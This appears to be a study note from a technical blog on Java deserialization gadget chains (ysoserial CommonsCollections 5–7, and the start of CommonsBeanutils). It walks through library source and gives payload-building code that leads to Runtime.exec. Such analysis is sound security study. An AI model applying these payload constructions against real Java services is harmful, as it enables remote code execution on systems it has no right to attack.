<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);  </span><br><span class="line">  </span><br><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constant</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(String.class);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// mock method name until armed  </span></span><br><span class="line">Class[] paramTypes = <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;;  </span><br><span class="line">Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;foo&quot;</span> &#125;;  </span><br><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(  </span><br><span class="line">      paramTypes, args);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// grab defensively copied arrays  </span></span><br><span class="line">paramTypes = (Class[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iParamTypes&quot;</span>);  </span><br><span class="line">args = (Object[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iArgs&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123; constant, instantiate &#125;);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// create queue with numbers  </span></span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain));  </span><br><span class="line">queue.add(<span class="number">1</span>);  </span><br><span class="line">queue.add(<span class="number">1</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// swap in values to arm  </span></span><br><span class="line">Reflections.setFieldValue(constant, <span class="string">&quot;iConstant&quot;</span>, TrAXFilter.class);  </span><br><span class="line">paramTypes[<span class="number">0</span>] = Templates.class;  </span><br><span class="line">args[<span class="number">0</span>] = templates;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">return</span> queue;</span><br></pre></td></tr></table></figure>


<h3 id="CommonCollections5"><a href="#CommonCollections5" class="headerlink" title="CommonCollections5"></a>CommonCollections5</h3><blockquote>
<p>[!NOTE] pre-requirements<br>JDK &gt;&#x3D; 1.8, reproduce with JDK1.8_0382<br>commons-collections:commons-collections:3.1</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Gadgets chain:</span></span><br><span class="line">transform:<span class="number">121</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">151</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:<span class="number">73</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">toString:<span class="number">131</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">readObject:<span class="number">86</span>, BadAttributeValueExpException (javax.management)</span><br><span class="line">readObject:<span class="number">461</span>, ObjectInputStream (java.io)</span><br></pre></td></tr></table></figure>

<p>In JDK1.8, there is new restriction on <code>AnnotationInvocationHandler</code>([[Java Deserialize Vulnerabilities ysoserial study#JDK fixes|here]]), but updates to the <code>BadAttributeValueExpException</code> class can be exploited to fill the vacancy.<br><code>TiedMapEntry</code> can bind key to a specific map, any operation on this entry will be delegated to that map.</p>
<p>Firstly, look into <code>BadAttributeValueExpException</code>‘s <code>readObject</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();  </span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;  </span><br><span class="line">        val = <span class="literal">null</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;  </span><br><span class="line">        val= valObj;  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>  </span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long  </span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer  </span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float  </span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double  </span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte  </span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short  </span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;  </span><br><span class="line">        val = valObj.toString();  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix  </span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Its <code>val</code> member could be any type assigned by constructor. Here we can see a constraint that <code>System.getSecurityManager()</code> should be null. Note that, in former JDK version(&lt;1.8), <code>BadAttributeValueExpException</code> have not override <code>readObject</code> so it’s not vulnerable.</p>
<p>Step into <code>TiedMapEntry</code>‘s <code>toString()</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> map.get(key);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>toString()</code> will call <code>getValue()</code> and call <code>map.get()</code>, satisfying <code>LazyMap</code>‘s constraint.</p>
<p>So here comes the Poc(partial):</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);  </span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);  </span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);  </span><br><span class="line"><span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);  </span><br><span class="line">      Reflections.setAccessible(valfield);  </span><br><span class="line">valfield.set(val, entry);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>End.</p>
<h3 id="CommonCollections6-jdk1-8-1-7"><a href="#CommonCollections6-jdk1-8-1-7" class="headerlink" title="CommonCollections6 jdk1.8 1.7"></a>CommonCollections6 jdk1.8 1.7</h3><blockquote>
<p>[!NOTE] pre-requirements<br>JDK1.7 or 1.8, reproduce successful on both<br>commons-collections:commons-collections:3.1</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Gadget chain:</span></span><br><span class="line">	java.io.ObjectInputStream.readObject()</span><br><span class="line">		java.util.HashSet.readObject()</span><br><span class="line">			java.util.HashMap.put()</span><br><span class="line">			java.util.HashMap.hash()</span><br><span class="line">				org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">				org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">					org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">						org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">						org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">						java.lang.reflect.Method.invoke()</span><br><span class="line">							java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>In general, <code>TiedMapEntry</code>‘s <code>hashCode()</code> method would call <code>map.get(key)</code> and make a flaw for <code>LazyMap</code>. <code>HashMap</code>‘s <code>readObject()</code> calls <code>hashCode()</code> of key to calculate hash, which makes sense for the exploitation above.</p>
<p>Firstly, see <code>HashMap</code>‘s <code>readObject()</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span>  </span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;  </span><br><span class="line">	    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  </span><br><span class="line">	        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();  </span><br><span class="line">	    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  </span><br><span class="line">	        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();  </span><br><span class="line">	    putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);  </span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>Step into <code>hash()</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;  </span><br><span class="line">    <span class="type">int</span> h;  </span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If key is a <code>TiedMapEntry</code>, then the common exploitation chain takes effect.</p>
<p>So the next step is to put a <code>TiedMapEntry</code> into hash map.<br>To avoid contaminating <code>LazyMap</code> during payload creation, <strong>we should not just call  <code>map.put</code> to insert node</strong>. In order to avoid calling <code>hash(entry)</code>, there are two alternative ways: by <code>putVal()</code> or directly inserting node into underlying hash table(later is what ysoserial does). Let’s reproduce the former way(<code>putVal</code>). </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);  </span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;padishah&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line"><span class="type">Method</span> <span class="variable">putMethod</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line"><span class="type">int</span> <span class="variable">JDK_VERSION</span> <span class="operator">=</span> -<span class="number">1</span>;  </span><br><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line">    putMethod = HashMap.class.getDeclaredMethod(<span class="string">&quot;putVal&quot;</span>, <span class="type">int</span>.class, Object.class, Object.class, <span class="type">boolean</span>.class, <span class="type">boolean</span>.class);  </span><br><span class="line">    JDK_VERSION = <span class="number">8</span>;  </span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;  </span><br><span class="line">    putMethod = HashMap.class.getDeclaredMethod(<span class="string">&quot;addEntry&quot;</span>, <span class="type">int</span>.class, Object.class, Object.class, <span class="type">int</span>.class);  </span><br><span class="line">    JDK_VERSION = <span class="number">7</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">putMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"><span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> transformerChain.hashCode();<span class="comment">// a random hashcode  </span></span><br><span class="line"><span class="keyword">if</span> (JDK_VERSION == <span class="number">8</span>) &#123;  </span><br><span class="line">    putMethod.invoke(map, hash, entry, <span class="string">&quot;value&quot;</span>, <span class="literal">false</span>, <span class="literal">true</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    putMethod.invoke(map, hash, entry, <span class="string">&quot;value&quot;</span>, <span class="number">0</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);  </span><br><span class="line"><span class="keyword">return</span> map;</span><br></pre></td></tr></table></figure>
<p>^CC6-1<br>Note that, <code>HashMap</code> for JDK1.7 adds node in a different way from that of JDK1.8. JDK1.7 use <code>addEntry</code> in replacement of <code>putVal</code>.</p>
<h3 id="CommonCollections7-jdk1-8-1-7"><a href="#CommonCollections7-jdk1-8-1-7" class="headerlink" title="CommonCollections7 jdk1.8 1.7"></a>CommonCollections7 jdk1.8 1.7</h3><blockquote>
<p>[!NOTE] pre-requirements<br>JDK1.7 or 1.8, only reproduced on JDK1.8<br>commons-collections:commons-collections:3.1</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Gadget chain:</span></span><br><span class="line">java.util.Hashtable.readObject  </span><br><span class="line">java.util.Hashtable.reconstitutionPut  </span><br><span class="line">org.apache.commons.collections.map.AbstractMapDecorator.equals  </span><br><span class="line">java.util.AbstractMap.equals  </span><br><span class="line">org.apache.commons.collections.map.LazyMap.get  </span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform  </span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform  </span><br><span class="line">java.lang.reflect.Method.invoke  </span><br><span class="line">sun.reflect.DelegatingMethodAccessorImpl.invoke  </span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke  </span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke0  </span><br><span class="line">java.lang.Runtime.exec</span><br></pre></td></tr></table></figure>

<h4 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h4><p>This vulnerability exists in <code>Hashtable</code>‘s hash collision check progress which is part of <code>readObject()</code>. It will compare hash between the node to be inserted and each existing node. If their hash appears to be the same, then compare further using <code>equals()</code>. Both <code>hashCode()</code> and <code>equals()</code> are delegated to the node itself.<br><code>AbstractMap</code>(which is the super class of <code>HashMap</code>)’s <code>equals()</code> will call <code>that.get()</code>, that satisfies <code>LazyMap</code>‘s trigger condition.<br>It’s quite easy to spoof two <code>LazyMap</code> nodes that have the same hash but different keys. This is how this vul occurs.</p>
<h4 id="Exploit-chain"><a href="#Exploit-chain" class="headerlink" title="Exploit chain"></a>Exploit chain</h4><p>Firstly, see <code>Hashtable</code>‘s <code>readObject()</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span>  </span><br><span class="line">     <span class="keyword">throws</span> IOException, ClassNotFoundException  </span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;  </span><br><span class="line">	    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  </span><br><span class="line">	        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();  </span><br><span class="line">	    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  </span><br><span class="line">	        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();  </span><br><span class="line">	    <span class="comment">// sync is eliminated for performance  </span></span><br><span class="line">	    reconstitutionPut(table, key, value);  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Step into <code>reconstitutionPut()</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span>  </span><br><span class="line">    <span class="keyword">throws</span> StreamCorruptedException  </span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();  </span><br><span class="line">	<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;  </span><br><span class="line">	<span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;  </span><br><span class="line">	    <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;  </span><br><span class="line">	        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();  </span><br><span class="line">	    &#125;  </span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We should satisfy <code>e.hash==hash</code> to reach <code>equals(key)</code>. When using <code>LazyMap</code> to decorate <code>HashMap</code>, <code>equals()</code> will delegate to <code>AbstractMap</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">	...</span><br><span class="line">	Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">	...</span><br><span class="line">	Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();  </span><br><span class="line">	<span class="keyword">while</span> (i.hasNext()) &#123;  </span><br><span class="line">	    Entry&lt;K,V&gt; e = i.next();  </span><br><span class="line">	    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();  </span><br><span class="line">	    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();  </span><br><span class="line">	    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;  </span><br><span class="line">	        <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))  </span><br><span class="line">	            <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">	    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">	        <span class="keyword">if</span> (!value.equals(m.get(key)))  </span><br><span class="line">	            <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">	    &#125;  </span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>^CC7-01</p>
<p>If the input object <code>o</code> is a <code>LazyMap</code>, <code>m.get(key)</code> will trigger its transformers. By the way, even if a <code>LazyMap</code> does not have the key of another map, it’s still equivalent to that map(which can be any map), since it’s able to create the missing key and <code>get()</code> will always return a value. ^1b8389</p>
<h4 id="Hash-collision"><a href="#Hash-collision" class="headerlink" title="Hash collision"></a>Hash collision</h4><p>After understanding the routine, let’s construct the two <code>LazyMap</code>. First, look at the <code>hashCode()</code> of <code>LazyMap</code>, which delegates to <code>AbstractMapDecorator</code>, then delegates to the underlying map(here is <code>HashMap</code>), finally find it in its super class <code>AbstractMap</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line">    Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();  </span><br><span class="line">    <span class="keyword">while</span> (i.hasNext())  </span><br><span class="line">        h += i.next().hashCode();  </span><br><span class="line">    <span class="keyword">return</span> h;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Consider a <code>LazyMap</code> with single entry: <code>&quot;aa&quot;: 1</code>, its hash code should equals to <code>&quot;aa&quot;.hashCode()</code>. Step into <code>String#hashCode</code>, its document says:</p>
<blockquote>
<p>Returns a hash code for this string. The hash code for a String object is computed as:<br>s[0]*31^(n-1) + s[1]*31^(n-2) + … + s[n-1]</p>
<p>using int arithmetic, where s[i] is the ith character of the string, n is the length of the string, and ^ indicates exponentiation. (The hash value of the empty string is zero.)</p>
</blockquote>
<p><code>&quot;ab&quot;.hashCode()</code> is calculated as <code>&#39;a&#39;*31 + &#39;b&#39;</code>. It’s easy to find a collision. Abstract the hash code of two-character string to <code>x*31 + y</code>, which is equals to <code>(x+1)*31 + (y-31)</code>, so one of the equivalences of <code>&quot;ab&quot;</code> is <code>&quot;bC&quot;</code> .</p>
<h4 id="Write-payload"><a href="#Write-payload" class="headerlink" title="Write payload"></a>Write payload</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line"><span class="type">LazyMap</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(innerMap1, chainedTransformer1);  </span><br><span class="line"><span class="type">LazyMap</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(innerMap2, chainedTransformer1);  </span><br><span class="line">lazyMap1.put(<span class="string">&quot;ab&quot;</span>, <span class="number">1</span>);  </span><br><span class="line">lazyMap2.put(<span class="string">&quot;bC&quot;</span>, <span class="number">1</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();  </span><br><span class="line">hashtable.put(lazyMap1, <span class="number">1</span>);  </span><br><span class="line">hashtable.put(lazyMap2, <span class="number">1</span>);  </span><br><span class="line">  </span><br><span class="line">Reflections.setFieldValue(chainedTransformer1, <span class="string">&quot;iTransformers&quot;</span>, transformers);  </span><br><span class="line">  </span><br><span class="line">lazyMap2.remove(<span class="string">&quot;ab&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> hashtable;</span><br></pre></td></tr></table></figure>

<p>Note that, while put <code>lazyMap2</code> into hash table, we can see in [[Java Deserialize Vulnerabilities ysoserial study#^CC7-01|this code block]] that <code>lazyMap2.get(&quot;ab&quot;)</code> would be called in <code>equals()</code>, so we should remove this redundant entry. To ensure <code>lazyMap2.get(&quot;ab&quot;)</code> is not equal to that of <code>lazyMap1</code>, we decorate <code>lazyMap2</code> with a transformer that will not return <code>1</code>(an empty chain, will get <code>ab: ab</code>).</p>
<p>End.</p>
<hr>
<h2 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h2><blockquote>
<p>[!NOTE] pre-requirements<br>JDK1.8<br>commons-beanutils:commons-beanutils:1.9.2<br>commons-collections:commons-collections:3.1<br>commons-logging:commons-logging:1.2</p>
</blockquote>
<h3 id="Using-TemplatesImpl-CB1-CB2"><a href="#Using-TemplatesImpl-CB1-CB2" class="headerlink" title="Using TemplatesImpl (CB1 CB2)"></a>Using TemplatesImpl (CB1 CB2)</h3><p><code>TemplatesImpl</code> has an property named <code>_outputProperties</code> whose getter is <code>getOutputProperties()</code> according to java bean naming principle. </p>
